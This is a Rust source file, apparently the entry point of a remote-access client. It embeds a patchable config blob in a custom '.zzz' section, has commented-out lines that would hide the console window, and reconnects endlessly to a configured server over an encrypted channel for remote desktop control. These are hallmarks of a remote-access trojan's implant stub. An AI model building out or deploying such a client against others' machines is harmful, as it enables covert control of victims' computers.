//#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
//#![cfg_attr(debug_assertions, windows_subsystem = "windows")]

#[no_mangle]
#[link_section = ".zzz"]
static CONFIG: [u8; 1024] = [0; 1024];

use std::time::Duration;
use winapi::um::winuser::SetProcessDPIAware;

pub mod features;
pub mod service;
pub mod handler;

use tokio::net::TcpStream;
use common::async_impl::connection::Connection;
use common::async_impl::packets::*;
use tokio::sync::oneshot;
use tokio::time::sleep;

use features::encryption;

#[tokio::main(flavor = "current_thread")]
async fn main() {
    let config = service::config::get_config();

    unsafe {
        // FIX REMOTE DESKTOP DPI ISSUES
        SetProcessDPIAware();
    }

    // Reconnection loop
    loop {
        println!("Connecting to server...");
        
        // Try to establish a connection
        let socket = match TcpStream::connect(format!("{}:{}", config.ip, config.port)).await {
            Ok(socket) => socket,
            Err(e) => {
                println!("Connection failed: {}. Retrying in 5 seconds...", e);
                sleep(Duration::from_secs(5)).await;
                continue;
            }
        };

        println!("Connected to server! Performing encryption handshake...");
        let connection = Connection::<ClientboundPacket, ServerboundPacket>::new(socket);
        
        // Perform encryption handshake
        let encryption_result = encryption::perform_encryption_handshake(connection).await;
        
        match encryption_result {
            Ok((encryption_state, reader, writer)) => {
                println!("Encryption handshake successful!");
                // Create a channel to signal termination between reader and writer
                let (tx, rx) = oneshot::channel::<()>();

                // Spawn writer task
                let write_task = tokio::spawn(
                    handler::writing_loop(
                        writer, 
                        rx, 
                        encryption_state.secret.clone(), 
                        encryption_state.nonce_generator_write
                    )
                );
                
                // Small delay to ensure writer is ready
                sleep(Duration::from_millis(100)).await;
                
                // Start reader task (will block until disconnection)
                handler::reading_loop(
                    reader, 
                    tx, 
                    encryption_state.secret.clone(), 
                    encryption_state.nonce_generator_read
                ).await;
                
                // Once the reading loop ends, wait for write task to complete
                if let Err(e) = write_task.await {
                    println!("Write task error: {}", e);
                }
                
                println!("Disconnected from server. Reconnecting in 5 seconds...");
                sleep(Duration::from_secs(5)).await;
            },
            Err(e) => {
                println!("Encryption handshake failed: {}. Retrying in 5 seconds...", e);
                sleep(Duration::from_secs(5)).await;
            }
        }
    }

    // let is_connected = Arc::new(Mutex::new(false));
    // let is_connecting = Arc::new(Mutex::new(false));


    // unsafe {
    //     // Fix DPI issues with remote desktop control
    //     SetProcessDPIAware();
    // }

    // loop {
    //     let config_clone = config.clone();
    //     let is_connected_clone = is_connected.clone();
    //     let is_connecting_clone = is_connecting.clone();

    //     if *is_connecting.lock().unwrap() {
    //         sleep(std::time::Duration::from_secs(5));
    //         continue;
    //     }

    //     if *is_connected_clone.lock().unwrap() {
    //         sleep(std::time::Duration::from_secs(5));
    //         continue;
    //     } else {
    //     }

    //     std::thread::spawn(move || {
    //         println!("Connecting to server...");
    //         {
    //             *is_connecting_clone.lock().unwrap() = true;
    //         }
    //         let stream = TcpStream::connect(format!("{}:{}", config_clone.ip, config_clone.port));

    //         match stream {
    //             Ok(str) => {
    //                 {
    //                     *is_connected_clone.lock().unwrap() = true;
    //                     *is_connecting_clone.lock().unwrap() = false;
    //                 }
    //                 handle_server(
    //                     str.try_clone().unwrap(),
    //                     str.try_clone().unwrap(),
    //                     is_connected_clone,
    //                     is_connecting_clone
    //                 );
    //             }
    //             Err(e) => {
    //                 println!("Failed to connect to server: {}", e);
    //                 {
    //                     *is_connecting_clone.lock().unwrap() = false;
    //                     *is_connected_clone.lock().unwrap() = false;
    //                 }
    //                 return;
    //             }
    //         }
    //     });
    //     sleep(std::time::Duration::from_secs(5));
    // }
}